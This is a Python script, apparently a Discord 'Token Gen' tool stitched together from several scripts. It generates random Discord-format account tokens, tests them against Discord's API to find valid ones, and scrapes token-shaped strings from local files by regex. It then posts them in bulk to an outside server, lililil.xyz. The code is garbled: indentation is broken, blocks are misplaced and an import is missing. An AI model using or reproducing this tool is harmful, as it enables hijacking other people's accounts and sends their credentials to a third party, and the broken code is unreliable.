import random
import string
import pathlib
import requests, os, threading, sys, time, random, ctypes, webbrowser,re, hashlib, datetime, os.path
import colorama
from colorama import Fore, init, Back, Style
from datetime import date
 
os.system("title [Token Gen] Made by ???")
 
def Spinner():
    l = ['|', '/', '-', '\\']
    for i in l+l+l:
        sys.stdout.write('\r' + Fore.YELLOW +'Starting Token Gen...'+i)
        sys.stdout.flush()
        time.sleep(0.2)
 
Spinner()
 
banner = (Fore.WHITE +Fore.BLUE +"                         ["+Fore.WHITE +Fore.BLUE +"+"+Fore.WHITE +Fore.BLUE +"]"+ Fore.WHITE +Fore.BLUE +"-------------------------------------------------------"+ Fore.WHITE +Fore.BLUE +"["+ Fore.WHITE +Fore.BLUE +"+"+ Fore.WHITE +Fore.BLUE +"]\n"+ 
Fore.WHITE +Fore.BLUE +'''\n  
██████████████████████████████████████▀███████████████
█─▄─▄─█─▄▄─█▄─█─▄█▄─▄▄─█▄─▀█▄─▄███─▄▄▄▄█▄─▄▄─█▄─▀█▄─▄█
███─███─██─██─▄▀███─▄█▀██─█▄▀─████─██▄─██─▄█▀██─█▄▀─██
▀▀▄▄▄▀▀▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▀▀▄▄▀▀▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▀▀▄▄▀ \n\n'''+ Fore.RESET + Fore.WHITE +Fore.BLUE +"                         ["+Fore.WHITE +Fore.BLUE +"+"+Fore.WHITE +Fore.BLUE +"]"+ Fore.WHITE +Fore.BLUE +"-------------------------------------------------------"+ Fore.WHITE +Fore.BLUE +"["+ Fore.WHITE +Fore.BLUE +"+"+ Fore.WHITE +Fore.BLUE +"]\n")
os.system("cls")
count = 0
current_path = os.path.dirname(os.path.realpath(__file__))
    
print(Fore.WHITE +Fore.BLUE +"                         ["+Fore.WHITE +Fore.BLUE +"+"+Fore.WHITE +Fore.BLUE +"]"+ Fore.WHITE +Fore.BLUE +"-------------------------------------------------------"+ Fore.WHITE +Fore.BLUE +"["+ Fore.WHITE +Fore.BLUE +"+"+ Fore.WHITE +Fore.BLUE +"]")
print(Fore.WHITE +Fore.BLUE +"                                         Welcome to "+Fore.WHITE+" Token-Gen "+Fore.WHITE+"- 2022 -")
print(Fore.WHITE +Fore.BLUE +"                                         [1] "+Fore.WHITE+"Token Generator")
print(Fore.WHITE +Fore.BLUE +"                                         [2] "+Fore.WHITE+"Token Checker(Checks all tokens you generated)")
print(Fore.WHITE +Fore.BLUE +"                                         [3] "+Fore.WHITE+"Manual Checker(Copy & Paste)")
print(Fore.WHITE +Fore.BLUE +"                                         [4] "+Fore.WHITE+"Exit")
print(Fore.WHITE +Fore.BLUE +"                         ["+Fore.WHITE +Fore.BLUE +"+"+Fore.WHITE +Fore.BLUE +"]"+ Fore.WHITE +Fore.BLUE +"-------------------------------------------------------"+ Fore.WHITE +Fore.BLUE +"["+ Fore.WHITE +Fore.BLUE +"+"+ Fore.WHITE +Fore.BLUE +"]")
opcion = input("\nChoice: ")
if opcion=='1':
    os.system("cls")
    print(banner)
    cantidad = input("\nAmount to generate: ")
    while int(count)<int(cantidad):
        Generated = "OT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        f= open(current_path +"/"+str("Generated")+str("")+".txt","a")
        f.write(Generated+"\n")
        print(Fore.GREEN +"Token: "+ Fore.RESET + Generated)
        count+=1
        if int(count)==int(cantidad):
            print("\n" + Fore.CYAN +Fore.BLUE +"Tokens generated successfully!")
            print(Fore.WHITE +Fore.BLUE +"Tokens saved in Generated.txt")
            input(Fore.BLUE +Fore.BLUE +"\nPress enter to exit")
            os.system("cls")
            print(Fore.WHITE +Fore.BLUE +"                         ["+Fore.WHITE +Fore.BLUE +"+"+Fore.WHITE +Fore.BLUE +"]"+ Fore.WHITE +Fore.BLUE +"-------------------------------------------------------"+ Fore.WHITE +Fore.BLUE +"["+ Fore.WHITE +Fore.BLUE +"+"+ Fore.WHITE +Fore.BLUE +"]")
            print(Fore.BLUE +Fore.BLUE +"                                                   Closing!")
            print(Fore.GREEN +Fore.BLUE +"                                               Have a good day!")
            print(Fore.WHITE +Fore.BLUE +"                         ["+Fore.WHITE +Fore.BLUE +"+"+Fore.WHITE +Fore.BLUE +"]"+ Fore.WHITE +Fore.BLUE +"-------------------------------------------------------"+ Fore.WHITE +Fore.BLUE +"["+ Fore.WHITE +Fore.BLUE +"+"+ Fore.WHITE +Fore.BLUE +"]")
            time.sleep(2)
            sys.exit()
            pass
    pass

if opcion=='2':
  print(fr"""
 
██████████████████████████████████████████████████████████████████████████
█─▄─▄─█─▄▄─█▄─█─▄█▄─▄▄─█▄─▀█▄─▄███─▄▄▄─█─█─█▄─▄▄─█─▄▄▄─█▄─█─▄█▄─▄▄─█▄─▄▄▀█
███─███─██─██─▄▀███─▄█▀██─█▄▀─████─███▀█─▄─██─▄█▀█─███▀██─▄▀███─▄█▀██─▄─▄█
▀▀▄▄▄▀▀▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▀▀▄▄▀▀▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀
                                                                                           
""")
  from requests import get, post
from random import randint

def variant1(token):
    response = get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})#Bad variant for mass token check due to the rate limit.
    return True if response.status_code == 200 else False

def variant2(token):
    response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
        return False
    else:
        return True

def variant2_Status(token):
    response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if response.status_code == 401:
        return 'Invalid'
    elif "You need to verify your account in order to perform this action." in str(response.content):
        return 'Phone Lock'
    else:
        return 'Valid'

if __name__ == "__main__":
    try:
        checked = []
        with open('Generated.txt', 'r') as tokens:
            for token in tokens.read().split('\n'):
                if len(token) > 15 and token not in checked and variant2(token) == True:
                    print(f'Token: {token} is Valid')
                    checked.append(token)
                else:
                    print(f'Token: {token} is Invalid')
        if len(checked) > 0:
            save = input(f'{len(checked)} valid tokens\nSave to File (y/n)').lower()
            if save == 'y':
                name = randint(100000000, 9999999999)
                with open(f'{name}.txt', 'w') as saveFile:
                    saveFile.write('\n'.join(checked))
                print(f'Tokens Save To {name}.txt File!')
        input('Press Enter For Exit...')
    except:
        input('Press Enter For The Manual Checker!')
if opcion=='3':
 import json
import math
import os
import pathlib
import re
import requests
from colorama import Fore


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def fast_exit(message):
    print()
    print(message)
    print()
    input(f"Press Enter button for exit.")
    cls()
    exit()


class Checker:
    def __init__(self):
        self.url = "https://lililil.xyz/checker"
        self.file_types = [".txt", ".html", ".json"]
        self.max_tokens = 10000
        self.tokens_part = 1000
        self.tokens_parsed = []
        self.res = {}

    def main(self):
        cls()
        print(fr"""
  
██████████████████████████████████████████████████████████████████████████
█─▄─▄─█─▄▄─█▄─█─▄█▄─▄▄─█▄─▀█▄─▄███─▄▄▄─█─█─█▄─▄▄─█─▄▄▄─█▄─█─▄█▄─▄▄─█▄─▄▄▀█
███─███─██─██─▄▀███─▄█▀██─█▄▀─████─███▀█─▄─██─▄█▀█─███▀██─▄▀███─▄█▀██─▄─▄█
▀▀▄▄▄▀▀▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▀▀▄▄▀▀▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀
                                                                                           
""")

        print(f"{Fore.RESET}[{Fore.CYAN}1{Fore.RESET}] Enter token")
        print(f"{Fore.RESET}[{Fore.CYAN}2{Fore.RESET}] Check file(Drag & Drop Or File Name")
        print()
        check_type = input(f"{Fore.CYAN}>{Fore.RESET}Select An Option{Fore.CYAN}:{Fore.RESET} ")

        if "1" in check_type:
            print()
            self.parse_tokens(input(f"{Fore.CYAN}>{Fore.RESET}Enter tokens{Fore.CYAN}:{Fore.RESET} "))
        elif "2" in check_type:
            print()
            token_file_name = input(
                f"{Fore.CYAN}>{Fore.RESET}Drag The File Or Type The Files Name"
                f" (supported types: txt, html, json){Fore.CYAN}:{Fore.RESET} "
            )
            if not os.path.exists(token_file_name):
                fast_exit(f"{token_file_name} directory not exist.")

            if os.path.isfile(token_file_name):
                with open(token_file_name, "r", errors="ignore") as file:
                    self.parse_tokens(file.read())
            else:
                for path in pathlib.Path(token_file_name).rglob("*.*"):
                    if path.suffix in self.file_types:
                        try:
                            with open(path, "r", errors="ignore") as file:
                                self.parse_tokens(file.read())
                        except Exception as error:
                            print(error)
                self.tokens_parsed = list(dict.fromkeys(self.tokens_parsed))

        else:
            fast_exit("Invalid Option.")

    def parse_tokens(self, text):
        pre_parsed = []
        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
            for token in re.findall(regex, text):
                pre_parsed.append(token)
        pre_parsed = list(dict.fromkeys(pre_parsed))

        for token in pre_parsed:
            try:
                jwt.decode(token, options={"verify_signature": False})
            except Exception as e:
                if str(e) == "Invalid header string: must be a json object" or str(e) == "Not enough segments":
                    self.tokens_parsed.append(token)

    def send_tokens(self):
        if len(self.tokens_parsed) > self.max_tokens:
            fast_exit(
                f"The current API limit is {Fore.CYAN}{self.max_tokens}{Fore.RESET} tokens. "
                f"Amount of sorted tokens - {Fore.CYAN}{len(self.tokens_parsed)}{Fore.RESET}."
            )
        elif len(self.tokens_parsed) == 0:
            fast_exit("Parser did not found tokens.")

        print()
        print(f"Found {Fore.CYAN}{len(self.tokens_parsed)}{Fore.RESET} tokens!")

        print()
        print("Have questions about the checker or notice an error in the output? "
              "Read the readme in the github repository or ask a question in issues!")

        res = {"tokensInfo": {"valid": [], "nitro": [], "payment": [], "unverified": [], "invalid": [],
                              "parsedTokens": []}, "tokensData": {}}
        parts = [self.tokens_parsed[d:d + self.tokens_part] for d in
                 range(0, len(self.tokens_parsed), self.tokens_part)]

        i = 1
        for tokens in parts:
            if len(tokens) < 100:
                ms = len(tokens) * 50
            else:
                ms = (len(tokens) // self.tokens_part * self.tokens_part * 5 * math.sqrt(
                    len(tokens) // self.tokens_part * self.tokens_part) +
                      len(tokens) % self.tokens_part * 5 * math.sqrt(len(tokens) % self.tokens_part))
            time = int(round(ms * 1.5 / 1000 / 60))

            print()
            print(
                f"Sending {Fore.CYAN}{i}{Fore.RESET}/{Fore.CYAN}{len(parts)}{Fore.RESET} part of tokens... "
                f"{Fore.CYAN}{len(tokens)}{Fore.RESET} tokens - {Fore.CYAN}{time}{Fore.RESET} min."
            )

            try:
                req = requests.post(self.url, json=tokens)

                if req.status_code == 429:
                    fast_exit(
                        f"Too many tokens check requests, try after "
                        f"{Fore.CYAN}{req.headers['RateLimit-Reset']}{Fore.RESET} seconds..."
                    )
                elif req.status_code != 200:
                    fast_exit(f"Status code is {Fore.CYAN}{req.status_code}{Fore.RESET}. {req.json()}")

                for tokens_type in res["tokensInfo"]:
                    res["tokensInfo"][tokens_type] += req.json()["tokensInfo"][tokens_type]
                res["tokensData"].update(req.json()["tokensData"])
            except Exception as e:
                fast_exit(f"An error occurred while trying to send tokens to the server. {e.args[1]}")

            self.res = res
            self.save_res(i, len(parts))
            i += 1

        fast_exit("All tokens saved!")

    def save_res(self, i, parts):
        stats = ""
        for token_type in self.res["tokensInfo"].keys():
            if self.res["tokensInfo"][token_type]:
                stats += f"{token_type} - {Fore.CYAN}{len(self.res['tokensInfo'][token_type])}{Fore.RESET}, "
                with open(token_type + ".txt", "w") as f:
                    for item in self.res["tokensInfo"][token_type]:
                        f.write("%s\n" % item)

        with open("tokens_data.json", "w") as file:
            json.dump(self.res, file, indent=4)

        print(f"{Fore.CYAN}{i}{Fore.RESET}/{Fore.CYAN}{parts}{Fore.RESET} part of tokens saved!\nStats: {stats[:-2]}")


if __name__ == "__main__":
    checker = Checker()
    checker.main()
    checker.send_tokens()

if opcion=='4':
    os.system("cls")
    print(Fore.WHITE +Fore.BLUE +"                         ["+Fore.WHITE +Fore.BLUE +"+"+Fore.WHITE +Fore.BLUE +"]"+ Fore.WHITE +Fore.BLUE +"-------------------------------------------------------"+ Fore.WHITE +Fore.BLUE +"["+ Fore.WHITE +Fore.BLUE +"+"+ Fore.WHITE +Fore.BLUE +"]")
    print(Fore.BLUE +Fore.BLUE +"                                                   Closing!")
    print(Fore.GREEN +Fore.BLUE +"                                               Have a good day :D")
    print(Fore.WHITE +Fore.BLUE +"                         ["+Fore.WHITE +Fore.BLUE +"+"+Fore.WHITE +Fore.BLUE +"]"+ Fore.WHITE +Fore.BLUE +"-------------------------------------------------------"+ Fore.WHITE +Fore.BLUE +"["+ Fore.WHITE +Fore.BLUE +"+"+ Fore.WHITE +Fore.BLUE +"]")
    time.sleep(2)
    sys.exit()
    pass
